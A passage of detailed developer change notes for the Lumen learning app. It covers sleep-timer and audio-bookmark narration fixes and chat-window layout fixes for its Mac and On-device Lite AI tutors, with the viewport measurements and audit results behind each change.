- The bookmark reader drops entries that are not objects.

How each is now checked:

- `audit:audio` adds six cases and one assertion: a deadline passing in the
  last sentence, a deadline passing while the next chapter loads, Next and
  Previous paused past the deadline, browser Back during narration, a real
  pronunciation override through Settings after stopping, a long bookmark at
  393 px and at 320 px with 200% text, and the section-fallback toast in
  "positions relocate after an edit". Against 5095726:

  ```
  - positions relocate after an edit: a section fallback announced “”
  - sleep timer lapsing in a chapter's last sentence: the playlist opened #/read/notes/part-01-foundations/02-problem-framing-and-objectives.md after the sleep deadline passed
  - sleep timer lapsing while the next chapter loads: chapter 2 was announced as continuing although nothing played: “Continuing narration: Chapter 2 — Problem Framing and Objectives”
  - Next and Previous while paused past the sleep deadline: Next on a player paused past the sleep deadline ended narration
  - browser Back during full-lecture narration: chapter 1's narration position was saved under chapter 2: {"v":2,"index":4,"total":107,"snippet":"A route planner may use graph search, a fraud product may co","section":"1. Intelligence as a system property"}
  - pronunciation override after stopping: stopped at 6 (“checks, and ordinary software.”), then overriding “checks” resumed at Full lecture · 1/107: “Chapter 1 — The AI/ML Mental Model”
  - a long audio bookmark on a phone: at 393 px and 100% text the narration sheet scrolls sideways: {"scrollWidth":711,"clientWidth":375,"deleteRight":719.703125,"viewport":393}
  ```

  Against main (57fb5cf) the new cases fail too:

  ```
  - sleep timer lapsing in a chapter's last sentence: the playlist opened #/read/notes/part-01-foundations/02-problem-framing-and-objectives.md after the sleep deadline passed
  - sleep timer lapsing while the next chapter loads: narration outlived the sleep deadline into chapter 2
  - Next and Previous while paused past the sleep deadline: Next on a player paused past the sleep deadline ended narration
  - browser Back during full-lecture narration: chapter 1's narration position was saved under chapter 2: 4
  - pronunciation override after stopping: Waiting failed: 5000ms exceeded
  - a long audio bookmark on a phone: at 393 px and 100% text the narration sheet scrolls sideways: {"scrollWidth":711,"clientWidth":375,"deleteRight":719.703125,"viewport":393}
  ```

  The pronunciation case times out on main because main stores bare
  integers. Main resumed that sentence exactly, so the case covers a problem
  the branch introduced.
- Unit tests: `narrationPositions.test.mjs` adds "a reworded sentence in a
  queue of the same length keeps its index". Against 5095726 it returned
  `{ index: 3, how: 'section' }`. `audioBookmarks.test.mjs` stores
  `[null, 5, "x", …]`, which threw `Cannot read properties of null (reading
  'id')` on 5095726 and on main. One existing assertion changed on purpose.
  "The sentence itself was rewritten, but its section survives" now also
  grows the queue by one chunk, so it still expects the section fallback,
  because a rewrite that keeps the length now keeps the index. The new test
  covers that case.

Not changed: with `localStorage` blocked outright (reading the accessor
throws, as Safari's Block All Cookies does), both main and this branch fail
at startup, before any narration code runs. A probe that replaces
`window.localStorage` with a throwing getter shows "Lumen could not render
this screen" at `#/home` and at chapter 1 on both builds. That app-shell hardening is
separate work. DEVICE_TESTING.md now tells the storage-failure device step to
use write failures (Private Browsing or full storage), not blocked storage.

Gate: `npm run check` passed (`audit:ai` 560/560, `audit:ai-eval` 27 cases,
hit@1 0.913). The startup entry is 716,654 bytes and the route screens
895,621 bytes (budgets 750,000 and 900,000). The full `npm run
check:browser` passed all 13 suites on the first attempt with no retries,
at a load average of about 11–12. Before that run, `audit:audio` also passed
alone with `LUMEN_BROWSER_RETRIES=0`. Two assertions in one of its new cases
were then swapped so each build fails with an accurate message, and the full
run used that final version.

## Bugs reproduced on 2026-09-28: the Mac tutor's chat window does not fit the screen (#93)

The chat-window audit of 2026-09-28 and its verification measured the Mac
tutor with a mocked model at 19 viewports. The new chat-fit checks in
`audit:ai-ui` (`LUMEN_AI_UI_CASES=chat-fit` runs them alone) collect every
failure before they report, and against main (e2f7997) they failed 67 ways:

- At 1280×720, 1366×768, 1225×671, 1180×820 and 1024×768, with five saved
  answers, the page scrolled 517–681 px as well as the conversation. The
  sticky composer covered the conversation's lower part, the conversation
  opened at its oldest turn, and the Evidence column set the row height,
  leaving a dead band of 22–170 px under the conversation (754 px at
  1280×720 with 200% text). Even at the page end the conversation stayed
  partly under the top bar or the composer, with the engine notes open, at
  200% text and on a first visit.
- Phones opened with the question box holding the mode's question, so the
  dock was 162 px tall (240 px on a first visit) and at 393×852 the
  suggested starts sat behind it. At 200% text the dock sat under the
  taller bottom navigation (its bottom at 775 against 755 at 393×852), and
  at 320×568 with 200% text the question box and Send were off screen. A
  saved conversation opened at its oldest turn, and at the page end the
  dock rose 32 px and opened a 40 px band above the navigation (50 px at
  820×1180).
- At 852×393 a saved conversation opened at the top, following left the
  newest 57 px behind the navigation, and Jump to latest rendered at
  y = −7,613.
- Following stopped on Send: Chrome's scroll anchoring moved the page (or
  the conversation) up when the new turn was added, the tutor read that as
  the learner scrolling back, and the answer streamed off screen. It is a
  race: in one run on main the first of three sends failed at both 393×852
  and 1280×720, and in six later runs none did, so the checks also assert
  that scroll anchoring is off on the tutor's page and conversation (it was
  `auto` on both).
- There was no keyboard handling: with a stand-in visual viewport 320 px
  shorter, the dock stayed behind the keyboard and the navigation stayed.

Fix:

- 981 px and wider, Mac engine only (`.ai-page:has(> .ai-learning-studio[data-ai-engine="mac-local"])`,
  so On-device Lite keeps its page until #94): the page is one column as
  tall as the room under the top bar. The conversation and the Evidence
  column each scroll on their own in one row, so there is no dead band, and
  the composer sits in flow under them. The page h1 is visually hidden and
  stays the page's heading. The header, the session statistics (now beside
  the title), the ready line, the engine picker and the mode tabs are
  compact, and the mode description and the "Your question" label remain
  only as accessible descriptions. Between 981 and 1079 px Grounding sits
  above the conversation, in a panel capped at min(40dvh, 320 px) when open.
- When the chrome would leave the conversation less than min(260 px, 40%
  of the screen), the page scrolls, with the composer still docked,
  instead of squeezing the conversation into a slit. (Since the review
  follow-up below, the page is then the only scroller:
  `html[data-ai-page-scroll]` replaced a measured `--ai-column-min`
  column height that kept the conversation scrolling inside the page.) That covers
  Grounding open at 1024×768, 200% text, the engine notes and a short
  window. 1280×720, 1366×768, 1180×820 and larger fit without page scroll
  with 50–90 px to spare. 1225×671 and 1024×768 fit with 1–6 px to spare,
  so the audit accepts either a fit or this fallback there: a wider font
  (Linux CI) or a wrapped mode tab can tip them over. The mode tabs wrap.
- Below 981 px the page stays the only scroller (#57). The new
  `src/hooks/useTutorDock.js` measures the top bar, the bottom navigation,
  the dock and an on-screen keyboard. It publishes `--ai-top`,
  `--ai-nav-space`, `--ai-dock-bottom` and `--ai-composer-space`, and
  switches the wide-screen fallback above. The dock and the page-end padding sit on the measured
  navigation, so the dock no longer slides under larger text or rises at
  the page end. A dock that would overlap the navigation because the tutor
  starts too far down stays in the page flow until it fits again. The hook
  takes the composer, the question box and, optionally, the conversation,
  so On-device Lite can reuse it (#94).
- The question box starts empty. The mode's question is its one-line
  placeholder, and "Use suggestion" puts it in the box in one tap. Switching
  modes clears a mode question that was never edited. The phone dock is
  114 px on first open. The first-visit permission card is tighter but
  keeps its words, "Use suggestion" appears once it is ticked, and an empty
  box on a first visit still names the permission as the reason Send is off.
- Following, revealing an answer and the "at the latest" check allow for
  the navigation, and in landscape Jump to latest is fixed just above it. A
  saved conversation opens at its latest turn, except while an Ask AI
  excerpt or a prepared question is being placed, and stays there while
  math and diagrams render, until the learner scrolls. If the server's
  check then asks for pairing, the page returns to the tutor's top, where
  the form is; with AI off the conversation stays at its latest turn, since
  it can still be read. Without the pairing rule, a phone opened past the
  pairing form, and in the full `audit:ai-ui` run a later scroll
  re-rendered the form while the audit typed the code (it failed at the
  pairing step in four of five runs until this was fixed).
- `overflow-anchor: none` on the Mac tutor's page and conversation.
- While the question box has focus and a `visualViewport` resize shows an
  on-screen keyboard (more than 120 px), the dock rises above it and the
  bottom navigation hides; both return on blur.

Behaviour changed on purpose, with its assertions updated. The box no
longer opens, or switches modes, holding the mode's question, so
`audit:ai-ui` taps "Use suggestion" before its Quiz, Flashcards and
open-lesson Explain sends and expects the Socratic start prompt as the
empty box's placeholder after a reveal. Navigating to the tutor now opens a
saved conversation at its latest turn, so on that one step
`viewport_scrolling_audit` checks that the conversation's end sits just
above the question box instead of the page top; its other top-of-page
checks are unchanged.

Deliberate limits, not bugs:

- At 375×667, 320×568 and with the iPhone standalone insets the welcome
  still starts partly under the dock at the page top (114, 94 and 85 px);
  the page scrolls to it. The audit asserts the box and Send in view and
  the dock on the navigation there, not the welcome.
- Landscape phones (at most 480 px tall) keep the composer in the page flow
  by design, so the question box is visible at the page end, not on first
  open.
- The engine picker was compacted, not folded into the tutor header.
- `interactive-widget` was not added to the viewport meta: Safari has not
  shipped it, and `resizes-content` would resize every screen on Android
  while typing.
- The keyboard handling is checked with a stand-in visual viewport only; it
  still needs a physical iPhone. So does the one-line placeholder: Chrome
  keeps it on one line and clips it without an ellipsis; if Safari wraps
  it, the empty box still stays one line tall (its height ignores the
  placeholder) and shows the top of the second line. The note above about
  On-device Lite's docked composer is left for #94.

Evidence:

- The chat-fit checks pass on this branch and fail on main as described.
  They cover five wide viewports with five saved answers (no page scroll
  where it fits, one scroller, at least min(260 px, 40%) of conversation,
  no dead band, the Evidence column scrolling inside the workspace, the
  composer clear of the conversation, the box and Send in view, opening at
  the latest turn, no cut-off mode tab, the page heading). They also cover
  Grounding open at 1024×768, the engine notes at 1280×720, 200% text and a
  first visit at 1280×720 (no slit, box and Send in view, the conversation
  uncovered at the page end). On 393×852, 375×667, 320×568, both at 200%
  text, a 393×852 first visit and 820×1180 they check the dock on the
  navigation, the empty box with its placeholder, one scroller, a one-line
  dock with the starts clear of it at 393×852, opening at the latest turn
  above the dock, and the dock where it docks at the page end. At 852×393
  they check opening at the latest turn, following above the navigation,
  Jump to latest in view and the composer above the navigation at the end.
  Following on Send runs three times each at 393×852 and 1280×720, each on
  a fresh visit; the stand-in keyboard runs at 393×852; and a pairing
  server with a saved conversation keeps the pairing form in view.
- Measured with the fix and five saved answers, each with no page scroll:
  conversation 315 px at 1280×720 (main: 35 px readable, 562 px of page
  scroll), 333 at 1366×768, 349 at 1180×820, 266 at 1225×671, 261 at
  1024×768 and 675 at 1920×1080.
- Gate on the final tip: `npm run check` passed (`audit:ai` 542/542, AI
  eval 27 cases, hit@1 0.913). The startup entry is unchanged at 715,643
  bytes. Route screens are 896,782 bytes of the 900,000 budget, 4,954 more
  than main's 891,828 (the hook, the fit rules and the suggestion), which
  leaves 3,218 bytes for #94. `npm run check:browser` passed all 13 suites
  on the first attempt with no retries (`audit:ai-ui` 165 s,
  `audit:responsive` 434 layout and 367 control checks, `audit:a11y` 57 axe
  runs). Earlier runs on this branch, with other agents' gates on the same
  machine, needed one retry of `audit:phone-ai-ui` (Lite's Jump to latest
  timing; Lite's code and styles are untouched here) and hit the pairing
  failure described above.

## Bugs reproduced on 2026-09-28: On-device Lite's question box is below the fold (#94)

The 2026-09-28 chat-window audit found that On-device Lite had no sizing
model at any screen size. The new chat-fit checks in `audit:phone-ai-ui`
(`LUMEN_PHONE_AI_UI_CASES=chat-fit` runs them alone) collect every failure
before they report. They open the app itself (`LUMEN_URL` when set) for
the first open, before any model download. For a loaded model and an
earlier conversation they use the fixture, which now renders the tutor
inside the app's top bar, page, engine picker and bottom navigation
(`?shell`, `?loaded`, `?history=N`). Against main (e2f7997, with
`LUMEN_URL` on its build) they failed 56 ways:

- First open at 320×568, 375×667, 393×852, 430×932, both 200% text sizes
  and 1280×720: the top of the question box was 1,019–4,944 px below the
  fold. It sat in a static form 432–634 px tall (955 and 1,226 px at
  200% text), holding the Depth and Answer length selects, the web
  toggle, a label, a four-row box, a footer and the send text.
- There was no dock or Options control: at the page end the static form
  ended 31 px above the navigation (3 px at 200% text) and moved with the
  page.
- The engine card showed its copy, five model facts and both privacy
  notes above the chat. That made it 986–1,266 px on phones, 2,725 and
  3,323 px at 200% text and 645 px at 1280×720. With the model loaded it
  was still 816 px at 393×852.
- A conversation from earlier in the session opened at its oldest turn
  (393×852, 320×568, 393×852 at 200% text, 852×393, 1280×720), and the
  tutor's page kept scroll anchoring on.
- A question sent at 393×852 was not shown above the composer.
- A stand-in on-screen keyboard neither moved the form nor hid the
  navigation.

Fix:

- The composer is a dock like the Mac tutor's, measured by the same
  `useTutorDock` hook. It is sticky just above the bottom navigation
  (`--ai-nav-space`), or above an on-screen keyboard with the navigation
  hidden, and at `max(12px, safe area)` from the bottom on wide screens.
  It holds a one-line question box that grows to about six lines, with
  Send (its label visually hidden below 720 px), and a row with Options,
  "Use suggestion" and the character count. It stays in the page flow
  where it would crowd the screen and on landscape phones up to 480 px
  tall. It is 118 px at 320–430 px wide.
- Depth, Answer length and the web fallback moved into an "Options"
  `TutorSheet`. Their labels, disabled rules and markup did not change.
  The send notes (streaming or structured output, retrieval at send time
  or the pre-fit source characters) moved into the sheet. The Options
  button reads "web on" while the fallback is allowed.
- The box starts empty, with the mode's question as its one-line
  placeholder and "Use suggestion" once the model is loaded. Switching
  modes clears an unedited suggestion. The reason Send is off is linked
  from Send and drawn once there is text in the box.
- The engine card keeps only what the next step needs. On first run that
  is the badge, the download approval (its full wording) and Download &
  load, 324 px at 393×852. Once the model is loaded it is one line (the
  model and its size, 710 MB), 72 px, with Manage. Details or Manage open
  the copy, the facts, device notes, the privacy notes, and Release memory
  and Clear model files. The disclosure's summary sits beside the heading
  and takes its own row when opened. The card's icon is hidden up to
  480 px, since the tutor header shows the same mark just above.
- A conversation from earlier in the session opens at its latest turn,
  just above the dock, and stays there while the card and the answers
  settle, until the learner scrolls. A question from another screen is
  focused in the box instead, in place when the box is docked.
- A question sent from the dock is scrolled into view above it, with its
  progress and Cancel (one scroll; answers are not followed as they
  stream, and Jump to latest remains).
- Jump to latest sits 10 px above the dock or the navigation, whichever
  is higher. The "at the latest" check and the jump itself allow for the
  dock.
- Page rules, in styles.css like #93's: scroll anchoring is off on the
  tutors' page for both engines. On phones up to 740 px the page heading
  is visually hidden and the engine picker compact for both engines
  (#93 did this for the Mac tutor only). Lite's page-end padding is the
  dock's offset, so the dock does not rise at the page end.
- Wide screens keep On-device Lite's page layout: the page grows with the
  tutor (the Mac tutor's fixed-height column stays scoped to the Mac
  engine), and the dock keeps the box on screen.
- `TutorSheet`'s head and foot are plain boxes. As `header` and `footer`
  under `body` they made a second banner landmark: with Lite's Options
  open, axe reported `landmark-no-duplicate-banner` and `landmark-unique`
  in all three themes at both widths. `audit:a11y` now opens On-device
  Lite, its Options sheet and the card's details in every theme and width
  (18 more axe runs). It fails six times each way with the old sheet.

Budget: the quiz, flashcard and study-plan views, and their styles, moved
to a lazily loaded `PhoneTutorResults` chunk (6,499 bytes of script and
2,770 of CSS). The tutor loads it when the model loads, when a structured
mode is chosen, or when the conversation holds a structured answer. The
Mac tutor's quiz views already load this way. Like the WebLLM runtime,
the chunk is cached by the service worker on that first online use, so a
model that can run offline finds it there. If it cannot load, the answer
shows "This view could not load" (since the review follow-up below, with
Reload rather than a Try again that could not work). Route screens are 892,595
bytes: 7,405 under the budget, 767 more than main and 4,187 fewer than
#93's tip.

Behaviour changed on purpose, with its assertions updated. The main
`audit:phone-ai-ui` flow no longer finds the Explain question in the box
after the model loads. It now asserts that Send is off with an empty box,
then taps Use suggestion, and does the same after switching to Flashcards.
The web toggle, the Answer length select and their checks are reached
through Options (`withOptions`). Send is `.phone-tutor__send`, since the
send row now holds the box. The checks and their messages are unchanged,
and the moved selects are also measured at 44 px inside the sheet.

Deliberate limits, not bugs:

- At 375×667 and 320×568, and on first run at 393×852, the welcome starts
  under the dock at the page top. The page scrolls to it. The first-run
  card leaves no room, since the download approval keeps its full wording.
  The checks assert that the box and Send are in view and that the dock
  sits on the navigation there. With the model loaded at 393×852 the
  welcome must clear the dock (27 px spare here; the check allows 40 px
  for wider fonts).
- On a page shorter than the screen (a loaded model and no conversation
  at 393×852) the dock rests just under the conversation, 29 px above the
  navigation instead of 8.
- Landscape phones keep the composer in the page flow, as the Mac tutor
  does.
- At 200% text the second meta button wraps, so the dock is 142–190 px. It
  stays docked because it takes under 60% of the room. (Fixed in the
  review follow-up below.)
- In the Contrast theme the mode label in a question bubble fails
  contrast (1.05:1), from the global `small` rule. It predates this change
  and is not in the audited states. (Fixed in the review follow-up below.)
- There is no streaming follow on On-device Lite: sending scrolls once, and
  Jump to latest brings back a streaming answer.

Evidence:

- The chat-fit checks pass on this branch against the Vite app, its
  production build (`LUMEN_URL`) and the gate's server, and fail on main
  as described.
- On first open at 320×568, 375×667, 393×852, 430×932, both 200% text
  sizes and 1280×720 they check that:
  - the box and Send are in view;
  - the dock sits on the navigation (sticky on wide screens), one line
    tall;
  - the card's facts and privacy notes are hidden;
  - there is no sideways scroll, and no overflow out of the page on wide
    screens;
  - one tap on Options shows Depth, Answer length and the web fallback,
    in view and at 44 px or more;
  - at the page end the conversation clears the dock and the dock sits on
    the navigation.
- With a loaded model at 393×852 they check the one-line card with
  Manage, Manage's two 44 px actions, the welcome clear of the dock, a sent
  question shown above the dock, and Jump to latest above the dock.
- With five earlier turns at 393×852, 320×568, 393×852 at 200% text,
  852×393 and 1280×720 they check opening at the latest turn above the
  dock (the navigation in landscape), scroll anchoring off, and the page
  end.
- The stand-in keyboard runs at 393×852.
- The dock must rest on the navigation only where the page is taller than
  the screen. Without WebGPU (as on Linux CI) the first-run card has no
  download approval and the page can be shorter.
- Gate on the branch tip: `npm run check` passed (`audit:ai` 542/542, AI
  eval 27 cases, hit@1 0.913). The startup entry is 715,605 bytes and the
  route screens 892,595 bytes. `npm run check:browser` passed all 13
  suites on the first attempt with no retries (`audit:phone-ai-ui` 47 s,
  `audit:ai-ui` 164 s, `audit:responsive` 434 layout and 367 control
  checks, `audit:a11y` 75 axe runs).

## Review follow-up on 2026-09-28: chat window fit (#93, #94)

Three review lenses (layout, code and behaviour) measured both engines at
20 viewports on the branch. Reproduced and fixed:

- Mac tutor, wide screens, a 10-line question typed over the latest of
  five answers. At 1280×720 the composer grew to 226 px and the column
  switched to its fallback: the page scrolled 63 px while the conversation
  still scrolled inside, 53 px of it sat under the composer and its end was
  87 px out of view. At 1440×900 the conversation shrank from 495 to
  377 px and its end went 120 px out of view. Now the column decision
  leaves the box's growth out, as the dock decision already did. A
  conversation that was at its end stays there when it shrinks. While the
  learner types, a page that scrolls moves up by the dock's growth. The box
  measured itself by collapsing to one line, which pulled a page at its end
  up by the box's height for good; the shared `fitQuestionBox` puts the
  page back. At 1280×720 the conversation is now 197 px with its end in
  view and no page scroll, and at 1440×900 it is 377 px with its end in
  view. Where the page scrolls (1024×768, 200% text) the end stays 13 px
  above the composer.
- The Mac fallback scrolled twice: at 1280×600 in every state (page
  37–155 px plus the conversation), at 1024×768 with Grounding open (page
  290 px, the conversation wholly under the composer at open) and at 200%
  text (page 84–163 px). The page is now the only scroller there, as on
  phones. `useTutorDock` sets `html[data-ai-page-scroll]`, with hysteresis,
  instead of publishing `--ai-column-min`. The conversation, the Evidence
  column and the Grounding panel then flow in the page under the sticky
  composer. When the layout switches, a conversation whose end was in view
  keeps it in view. After a window resize the page shows its end, the
  latest turn above the box, as the column did; Grounding or the engine
  notes opened by the learner stay in view. Without this, `audit:responsive`
  caught that resizing the window to 1225×450 left the page at its top with
  its end out of reach, since the switch lands a frame after the resize.
- The empty conversation's suggested starts were cut 9–21 px inside its
  box at 1024×768, 1225×671 and a 1280×720 first visit. The welcome is
  tighter at 981 px and wider.
- On touch tablets (coarse pointer, 981 px and wider) the compact chrome
  had 36, 28 and 34 px controls. The engine picker, the mode tabs, Refresh,
  Options and Use suggestion are 44 px there again. Fine pointers keep the
  compact sizes, so the column's room is unchanged on desktops.
- Reading back mid-answer from outside the conversation (PageUp, Home or
  ArrowUp with Options focused, or a wheel over the Evidence column) was
  undone in 3 of 31 runs. The tutor's own follow scroll landed just after
  the key, and its scroll event resumed following as if the learner had
  come back to the end. The tutor now marks its follow scrolls and does not
  resume on them. The rule predates #93; #93 made the race decisive,
  because the page no longer scrolls there.
- Reader Ask AI with a saved conversation opened it at its oldest turn.
  The open-at-latest hold skipped inserts, and consuming the insert ended
  the hold. With a docked box the conversation now opens at its latest
  turn with the excerpt in the box (on wide screens inside its own
  scroller, the page untouched). An undocked box is revealed instead, as
  before.
- At 200% text on phones the empty Mac dock was 52 px taller than main's
  (167 against 115 px), because Use suggestion took a row of its own. It
  now shrinks to its sparkle icon (its name unchanged) beside Options when
  the row is narrower than 12.5em of its own text (17.5em on Lite), so the
  dock is 115 px again.
- In the Contrast theme the suggested question (placeholder #333 on white)
  looked like typed text (#000). Both tutors' placeholders are italic
  there. The `text-overflow: ellipsis` on `::placeholder` never applied
  (Chrome computes `clip`) and is gone.
- On-device Lite kept the sent question in the dock. After each send the
  dock was 142 px at 393×852 (286 px at 200% text) and covered the new
  answer. An answered question now leaves the box, as in the Mac tutor; an
  error, Cancel or a declined search keeps it for Retry and editing.
- Lite dropped keyboard focus to the page for the whole generation after
  Enter, because the box was disabled (this predates #94). The box is now
  read-only while an answer runs, so focus stays in it, and Up-arrow
  recall is off meanwhile.
- Lite at 320×568 with 200% text: a long question typed at the page top
  pushed the dock 29 px behind the navigation, because the tutor's top
  held it. The page now scrolls by the growth while the learner types.
- Lite on wide screens: the dock covered the empty welcome at the page top
  (98–118 px). The page heading is now hidden on wide screens for both
  engines, and Lite's header and welcome are compact at every width. At
  1280×720, 1366×768 and 1440×900 the welcome text ends above the dock.
- Lite's answer actions (Copy, Save, Regenerate, Listen) overflowed
  sideways at 320 px and at 200% text, so the phone zoomed the page out to
  a 370 or 496 px layout viewport, with "On-device Lite" one letter per
  line. This predates #94. On phones the actions now take their own row
  under the label.
- Lite's "This view could not load. Try again" could never work: a browser
  keeps a failed module download for the life of the page, so Try again
  got the same failure without a request. The answer now says a reload
  shows the view and clears the on-device conversation, and offers Reload.
  An automatic reload, as `recoverableImport` does for screens, would
  clear the conversation without asking.
- The first-run engine card's Tab order went consent → Download & load →
  Details, back up to the card's top. The disclosure now follows the
  heading in the page.
- In the Contrast theme the mode label in Lite's question bubbles was
  1.05:1 (the global `small` rule on navy). It keeps the bubble's white.
- The open-at-latest hold, now `holdLatest` and shared by both tutors,
  releases its resize observer and window listeners when the learner
  scrolls or after 1.5 s, not only when the tutor unmounts.
- Audit precision: Clear model files is opened through Manage and clicked
  as a learner would, and Lite's `useSuggestion` checks that the box holds
  exactly the placeholder's question and that the button is gone.

Setup changed with the behaviour, assertions unchanged: the main
`audit:phone-ai-ui` flow re-sent the question left in the box after three
answers, and waited for an enabled Send as its "answer done" signal. It now
puts the same question back before those re-sends, and after the
strong-library answer it waits for a writable, empty box instead. Its Clear
model files step opens Manage and scrolls the button clear of the dock
before a real click.

Assertion changed on purpose: the chat-fit fallback cells (1225×671 and
1024×768, now also 1280×600) required the conversation to stay its own
scroller, pinned to its minimum height, inside the scrolling page. They
now require one scroller. When the page scrolls, neither the conversation
nor the Evidence column scrolls, the conversation opens at its latest turn
above the sticky composer, and its end clears the composer at the page
end. The Grounding-open and engine-notes states are checked the same way.
Where the page does not scroll, the column checks are unchanged.

Not changed, deliberate limits:

- Mac tutor, first visit at 320×568 with 200% text: the consent card
  keeps its full wording, so the dock (373 px) stays in the page flow and
  the box is reached by scrolling past it; nothing is covered. Main is the
  same (545 px, at 1,678 px down the page).
- Phone first opens at 375×667, 320×568, with iPhone standalone insets and
  at 200% text still start the welcome under the dock: Mac 88–243 px, Lite
  45–89 px, and none of it above the dock for Lite loaded at 375×667 and
  on a Lite first run at 393×852. Main had the conversation below the fold
  (0–6 px visible). The page scrolls to it; the chrome above it (engine
  picker, tutor header, ready line, mode, and on a first run the download
  approval) is what the learner uses first.
- Landscape phones (480 px tall or less): the box and Send are not on
  screen at open or after a send, as on main. The composer stays in the
  page flow there by design, and Jump to latest floats above the
  navigation. #93's "box and Send visible at every tested size" does not
  cover viewports 480 px tall or less.
- On-device Lite still has no streaming follow; Jump to latest brings
  back a streaming answer (5.7 KB of route budget is left).
- Phones, in-app navigation to a saved conversation: focus goes to the
  visually hidden page heading, as on every route (`audit:a11y` checks
  heading focus on navigation), while the view is at the latest turn. The
  first Tab moves to the engine picker at the top of the page.

Regression checks, each failing before the fix and passing after:

- `audit:ai-ui` chat-fit (`LUMEN_AI_UI_CASES=chat-fit`) adds 1440×900 and
  1280×600 to the wide cells, a long question at 1280×720, 1440×900,
  1024×768 and 1280×720 at 200% text, empty conversations at 1225×671,
  1024×768 and 1280×600, 44 px chrome on the touch cells, the Contrast
  placeholder, a read-back race made certain (Home dispatched from Options
  right after the tutor's follow scroll, before its scroll event), a real
  Home press after each 1280×720 follow run, Ask AI with five saved
  answers at 1280×720 and 393×852, and the empty dock at 200% text.
  Against this branch's build before the fix it failed 19 ways; against
  main (audit-dist) 68.
- `audit:phone-ai-ui` chat-fit (`LUMEN_PHONE_AI_UI_CASES=chat-fit`) adds the
  engine card's Tab order on every first open, the page width after
  answers at 320×568 and 393×852 at 200% text, sending with Enter
  (focus kept, question cleared, one-line dock), a long question at the
  page top at 320×568 with 200% text, the welcome above the dock at
  1280×720, 1366×768 and 1440×900, axe `color-contrast` over a
  conversation in Paper, Night and Contrast, and a failed view download
  whose action must reload. The fixture runs from source, so these ran
  against the pre-fix source with its build as `LUMEN_URL`: 17 failures.
- `src/lib/tutorDock.test.mjs` checks that `holdLatest` lets go of its
  observer and listeners when it stops and calls `onStop` once.

Gate on the final tip: `npm run check` passed (`audit:ai` 543/543, AI eval
27 cases, hit@1 0.913). The startup entry is 715,605 bytes. The route
screens are 894,581 bytes: 1,986 more than before the review, 5,419 under
the budget. `npm run check:browser` passed all 13 suites on the first
attempt with no retries (`audit:ai-ui` 189 s, `audit:phone-ai-ui` 64 s,
`audit:responsive` 434 layout and 367 control checks, `audit:a11y` 75 axe
runs). An earlier full run failed `audit:phone-ai-ui` (the setup change
above) and `audit:responsive` (the resize switch above) on both attempts.
Each was fixed and passed alone with `LUMEN_BROWSER_RETRIES=0` before the
final run.

## Second review follow-up on 2026-09-28: chat window fit (#93, #94)

An independent re-verification of the follow-up above found four defects
still open. The branch was first rebased onto main (57fb5cf: the themed
select #92, and the docs moved to `docs/guides/` and `docs/internal/`).
Lite's Depth and Answer length, which this branch moved into the Options
sheet, carry `ui-select` there with main's labels ("Standard (640)"),
since main removed their old skin. Reproduced against the rebased tip
(3727c96) and fixed:

- Mac tutor, wide column (1225×671, 1280×720, 1366×768, 1440×900), a
  question typed key by key over the latest of five answers: from the
  second line on, the conversation stopped 48, 96 and then 120 px short
  of its end, with the end 97 px hidden, and it stayed there after the box
  lost focus. `fitQuestionBox` measures the box by setting it to one line
  for a moment. That layout made the conversation taller, the browser
  clamped its scroll position, and the box's real height then left it
  short. The clamp's own scroll event recorded "not at the end", so the
  keep-at-end observer did nothing. The earlier check placed the whole
  draft in one go, which never measures a shorter box, so it passed. Now
  `fitQuestionBox` also takes the conversation. It puts the conversation
  back where it was, or at its end if it was at its end, and returns the
  position so the tutor treats that scroll as its own and not as the
  learner returning to the end.
- In the same column a 10-line draft shrank the conversation below its
  minimum of min(260 px, 40% of the window): to 148 px at 1225×671,
  197 px at 1280×720 and 245 px at 1366×768. `useTutorDock` now publishes
  `--ai-field-max`: the box grows only by whole lines the conversation can
  spare above its minimum, then scrolls inside. With the box at one line
  the conversation is 266 px at 1225×671, 315 px at 1280×720, 363 px at
  1366×768 and 495 px at 1440×900. With a long question the box is 1, 3,
  5 and 6 lines (48, 96, 144 and 168 px), and the conversation is 268,
  269, 269 and 377 px, its end in view. A draft still never switches the
  column into page scrolling.
- On-device Lite at 320×568 with 200% text: with a long question kept in
  the box, after it lost focus and the page went back to its top, the dock
  sat at 200–500 px against the navigation at 471 px, as it did for a
  question put in the box without focus. Only typing had been fixed. The
  undock rule left the box's growth out of its overlap test. That is still
  so while the box has focus, since the page scrolls instead. Once the box
  loses focus the growth counts, so near the top of the page that dock
  stays in the page flow, and it docks again further down (163–463 px at
  the page end). The rule is shared: the Mac tutor at 320×568 with 200%
  text, a kept draft and the page at its top had its dock 4 px above the
  navigation, where it keeps 8 px, and now stays in the flow there too.
- On-device Lite at 1225×671, model loaded, nothing asked: the dock (top
  541 px) cut the welcome heading (530–550 px) and hid its line
  (556–576 px). With the model loaded, at 981 px and wider, the gaps
  between the tutor's cards are 8 px (16 before). With a mouse, the mode
  tabs and the dock's Options and Use suggestion are 36 px, as in the Mac
  tutor's compact chrome; touch screens keep 44 px. The heading is now
  479–499 px and its line 505–525 px, above the dock at 549 px. A first run
  keeps its spacing: with the same compaction, the 1366×768 first run's
  welcome heading (629–649 px) would have been newly cut by the dock at
  646 px. As before, the first-run welcome waits under the download card
  at these heights, and the dock does not cut it.

Assertions changed on purpose:

- `audit:phone-ai-ui` first open at 1280×720 required every control in the
  Options sheet to be 44 px. After the rebase the sheet's selects are
  main's themed select, 40 px on a desktop by the #92 contract (44 px on
  phones and touch screens), so the rebased tip failed that check. A
  desktop select now needs 40 px; buttons still need 44 px.
- `audit:controls` measured Depth and Answer length in the old static
  composer, which this branch removed, so it timed out waiting for them.
  It now opens Options and measures them in the sheet (both in Quiz too,
  with Answer length disabled).
- The large-text dock comment in `audit:ai-ui` said a long draft never
  undocks the Mac dock. It now says the draft never undocks it below the
  top of the tutor. The check itself, a draft with the page at the latest
  turn, is unchanged.

Regression checks, each failing before the fix and passing after:

- `audit:ai-ui` chat-fit: the long-question check types with real keys. It
  places a 10-line draft in one go, types one more key, then types six
  lines from an empty box (Shift+Enter) and leaves the box. After each step
  it needs the conversation at its end, its end uncovered and the
  conversation at or above its minimum. It runs at 1280×720, 1440×900,
  1366×768, 1225×671, 1024×768 and 1280×720 at 200% text. Against the
  rebased tip's build it failed 23 ways, at all four column sizes.
- `src/lib/tutorDock.test.mjs`: `fitQuestionBox` keeps a conversation at
  its end as the box grows, and leaves one read back where it was, both
  well above the end and just above it. Both failed on the rebased tip's
  source.
- `audit:phone-ai-ui` chat-fit: the long-question check at 320×568 with
  200% text also measures the kept question after the box loses focus and
